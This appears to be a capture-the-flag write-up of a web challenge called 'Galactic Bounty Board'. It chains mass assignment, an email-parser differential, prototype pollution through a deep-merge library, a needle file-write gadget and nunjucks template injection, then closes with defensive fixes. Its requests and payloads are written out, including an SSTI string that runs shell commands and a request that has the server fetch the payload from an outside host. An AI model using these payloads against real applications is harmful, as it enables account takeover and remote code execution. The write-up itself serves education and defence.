I'll be honest - this one took me a while. It's one of those challenges where no single bug is enough on its own. You've got to pull five completely different threads and braid them into a single rope strong enough to hang the whole application. Let me walk you through how each piece clicked into place, from the moment I loaded the page to the moment the flag appeared.

1. Reconnaissance

First Impressions

The application greets you with a fairly typical login/register setup - the Galactic Bounty Board. Nothing fancy on the surface: a form, some buttons, a clean UI. Behind the scenes, script.js handles all the authentication flows: registration, login, OTP verification, and email sending.

I pulled up script.js and traced every endpoint it touches. Four stood out immediately:

  • /api/register - account creation
  • /api/login - authentication
  • /api/verify - OTP email verification
  • /api/sendEmail - resend verification

One thing I noticed early: every message in the frontend gets rendered through jQuery's .text() rather than .html(). So client-side XSS is off the table. Whatever's interesting about this app lives on the server.

The Internal Mail Service

There's a companion mail page - an inbox that shows emails addressed to test@email.htb. I spotted the target address right in the HTML:

<div class="alert-center">
    Your email address is <strong>test@email.htb</strong>
</div>

The inbox loads emails dynamically from a MailHog instance running on 127.0.0.1:9000. Only emails whose Raw.To contains exactly test@email.htb show up. This detail seemed like a footnote at first, but - spoiler - it turns out to be the entire mechanism behind vulnerability number two.

2. Mass Assignment - Registering as Admin

The Flaw at a Glance

Here's the registration handler, stripped down to the part that matters:

const registerAPI = async (req, res) => {
  const { email, password, role = "guest" } = req.body;
  const emailDomain = emailAddresses.parseOneAddress(email)?.domain;

  if (!emailDomain || emailDomain !== 'interstellar.htb') {
    return res.status(200).json({ message: 'Registration is not allowed for this email domain' });
  }

  try {
    await User.createUser(email, password, role);
    return res.json({ message: "User registered. Verification email sent.", status: 201 });
  }
};

See the problem? The developer writes role = "guest" as a destructuring default, thinking that ensures every new user starts as a guest. But JavaScript destructuring defaults only kick in when the property is absent from the object. If I include role in my request body, my value gets used instead - passed straight through to the database.

Why this works: JavaScript's const { role = "guest" } = req.body only applies the default when req.body.role is undefined. If I send "role": "admin", the default is ignored.

The Exploit

I fired off the registration request with an extra field:

POST /api/register

{
  "email": "attacker@interstellar.htb",
  "password": "mypassword",
  "role": "admin"
}

The server happily accepted it. I now had an admin account in the database - but I couldn't log in yet. The account still needed OTP verification, and that email went to interstellar.htb, a domain I don't control. Which brings us to the real puzzle.

3. Email Parser Differential - Stealing the OTP

The Filtering Problem

The internal inbox only shows emails addressed to test@email.htb. The inbox filtering logic compares each recipient with a strict equality check:

for (let item of response.data.items) {
    const recipients = item.Raw.To || [];
    if (recipients.some((recipient) => recipient === 'test@email.htb')) {
        mails.push(item);
    }
}

My verification email goes to attacker@interstellar.htb, which doesn't match. I can't read it. So I needed a way to register with an address that passes the interstellar.htb domain check and simultaneously delivers the email to test@email.htb.

Sounds impossible. But two different email parsers disagree about what constitutes a valid address - and that disagreement is exactly the gap I needed.

RFC 5322 Comments to the Rescue

The registration endpoint uses the email-addresses npm library - a strict RFC 5322 parser. Nodemailer, which actually sends the email, uses its own looser parser. RFC 5322 says that anything inside parentheses is a comment and should be semantically ignored. So I crafted this monstrosity:

<(<test@email.htb>)y@interstellar.htb>

Here's what each parser sees:

  • email-addresses (strict): Sees one valid address. The (<test@email.htb>) portion is an RFC comment - discarded. Extracts y@interstellar.htb as the actual address. Domain = interstellar.htb. Passes:
  • Nodemailer (loose): Spots angle brackets around test@email.htb inside the string and interprets it as a real delivery target. Issues SMTP RCPT TO for both test@email.htb and the outer address. MailHog receives the email with test@email.htb in Raw.To.

The domain check passes. The email lands in the inbox. I can read the OTP.

Executing the Chain

Step 1 - Register with the crafted address:

POST /api/register
{
  "email": "<(<test@email.htb>)y@interstellar.htb>",
  "password": "mypassword",
  "role": "admin"
}

Step 2 - Trigger the OTP:

POST /api/sendEmail
{
  "email": "<(<test@email.htb>)y@interstellar.htb>"
}

Step 3 - Read the OTP from the inbox, then verify:

POST /api/verify
{
  "email": "<(<test@email.htb>)y@interstellar.htb>",
  "code": "839271"
}

Logged in. JWT token issued with role: "admin". The admin panel opens up - and with it, a /transmit feature for making server-side HTTP requests.

4. Missing Sanitization - The Open Door Nobody Locked

Add vs. Edit

Here's where things get interesting. The application has two endpoints for managing bounties - one to create, one to edit. Compare them:

// Add endpoint - sanitization applied
const addBountiesAPI = async (req, res) => {
  const { status = "unapproved", ...bountyData } = req.body;
  const sanitizedBountyData = sanitizeHTMLContent(bountyData); // ← sanitizer runs
  await BountyModel.create({ ...sanitizedBountyData, status });
};

// Edit endpoint - no sanitization
const editBountiesAPI = async (req, res) => {
  const { ...bountyData } = req.body;
  const data = await BountyModel.findByPk(req.params.id, { ... });
  const updated = mergedeep(data.toJSON(), bountyData); // ← raw user data merged directly
  await data.update(updated);
};

The sanitizer exists. It works. But whoever wrote the edit endpoint just... forgot to call it. Raw user input flows straight from req.body into a deep merge function, then into the database. Since bounty descriptions are rendered with nunjucks' | safe filter (to support rich HTML in the seeded demo data), anything I inject gets rendered without escaping.

This is the pattern that kills: The defense existed, it was just applied inconsistently. The add endpoint is safe. The edit endpoint is wide open. One code review of the edit route alone would have caught it - but nobody reviewed it separately from the add route they'd already secured.

But I'm not here for stored XSS. I need something more powerful. What I really want is to abuse that mergedeep call for something far nastier.

5. Prototype Pollution + needle Gadget - Writing Arbitrary Files

Poisoning the Prototype

That mergedeep call in the edit endpoint uses @christopy/mergedeep - a package the challenge author deliberately placed as a vulnerable dependency. Like most vulnerable merge libraries, it recursively traverses the source object without filtering dangerous keys like __proto__.

So I sent this to the edit endpoint:

PUT /api/bounties/2

{
  "__proto__": {
    "output": "/app/views/index.html"
  }
}

After this request, every plain object in the entire Node.js process inherits output: "/app/views/index.html" through the prototype chain. Not as an own property - you won't see it if you inspect the object directly - but it's there, lurking, waiting for something to read it.

The needle HTTP Client - The Unwitting Accomplice

The app has a fetchURL utility that uses the needle HTTP client:

const fetchURL = async (url) => {
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    throw new Error("Invalid URL");
  }

  const options = {
    compressed: true,
    follow_max: 0,
    // no "output" property here
  };

  return new Promise((resolve, reject) => {
    needle.get(url, options, (err, resp, body) => {
      resolve(body);
    });
  });
};

Look at that options object carefully. It has compressed and follow_max. No output property. But here's the thing - needle has a documented feature: if options.output is set, it writes the HTTP response body directly to that file path on disk.

When needle internally checks options.output, JavaScript first looks at the object itself (not found), then walks up the prototype chain - and there it is. The value I planted via prototype pollution. Needle dutifully writes the response body to /app/views/index.html.

The subtlety here is terrifying: The vulnerability isn't in the code that gets exploited (needle). It's in a completely different part of the application (the merge function). A reviewer auditing needle usage in isolation would find nothing wrong. A reviewer auditing the merge function might spot the pollution but not imagine the needle gadget. Only full data-flow analysis reveals the chain.

6. SSTI - From Template Overwrite to Shell Access

Crafting the Payload

Now I control what gets written to /app/views/index.html. The application uses nunjucks as its template engine. When someone visits the index page, nunjucks renders that file - evaluating any template syntax it finds.

I hosted the following nunjucks SSTI payload on my server:

{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /flag.txt')")()}}

It works because range is a built-in nunjucks object. Accessing .constructor gives you the JavaScript Function constructor. Calling it with a string creates a new function whose body is that string. Invoking it executes arbitrary JavaScript - including spawning child processes.

Pulling the Trigger

Step 1 - Poison the prototype (already done).

Step 2 - Trigger needle to fetch my payload:

POST /api/transmit
{
  "url": "http://my-server.com/payload"
}

Needle fetches the URL, finds output on the prototype chain, writes my SSTI payload to /app/views/index.html.

Step 3 - Visit the index page. Nunjucks evaluates the template, executes tail /flag.txt, and the flag appears right in the HTTP response.

9. Defensive Recommendations

Mass Assignment

Never destructure sensitive fields from request bodies. Explicitly assign server-controlled values: 

// Vulnerable
const { email, password, role = "guest" } = req.body;

// Fixed - role is never trusted from the client
const { email, password } = req.body;
const role = "guest";

Parser Differentials

If email-addresses validates the input, extract the normalized canonical address from its parse result and use only that downstream. Never pass the raw string to a different parser that might interpret it differently.

Sanitization Consistency

Sanitization should live at the model layer - inside BountyModel.create and BountyModel.update - not selectively in individual route handlers. Centralizing it makes it impossible to forget.

Prototype Pollution

Block dangerous keys before processing any merge operation:

const BLOCKED_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target, source) {
    for (let key in source) {
        if (BLOCKED_KEYS.has(key)) continue;
        // ... rest of merge logic
    }
}

Alternatively, use Object.create(null) for configuration objects - these have no prototype chain and are immune to pollution.

The needle Gadget

Use Object.create(null) for options objects passed to third-party libraries, eliminating prototype chain lookups entirely:

const options = Object.create(null);
options.compressed = true;
options.follow_max = 0;

SSTI Prevention

Never allow user-controlled data to reach the filesystem in a location the template engine renders. Any file-write primitive - prototype pollution gadgets, path traversal, or SSRF - should be treated as critical in applications using server-side template engines.

10. Key Lessons

The most important insight from this challenge is that vulnerabilities rarely exist in isolation. Every defensive measure in this application was applied somewhere - the sanitizer existed, the domain check worked correctly, the file:// protocol was blocked. The attack succeeded because defenses were applied inconsistently, and because the intersections between components created emergent behavior no single component review would have caught.

Prototype pollution is particularly insidious in this regard. The vulnerability isn't in the code that gets exploited (needle), but in a completely unrelated part of the application (the merge function). A reviewer auditing needle usage in isolation would find nothing wrong. A reviewer auditing the merge function might spot the pollution but never imagine the needle gadget. Only a full data-flow analysis - tracing untrusted input through every system that subsequently handles it - reveals the complete picture.

The defensive principle that follows: treat Object.prototype as a security boundary. Validate that no untrusted data ever reaches it, the same way you'd protect SQL query construction or shell command assembly. Because once the prototype is poisoned, every object in the process becomes a potential weapon - and you'll never see it coming by looking at the victim code alone.
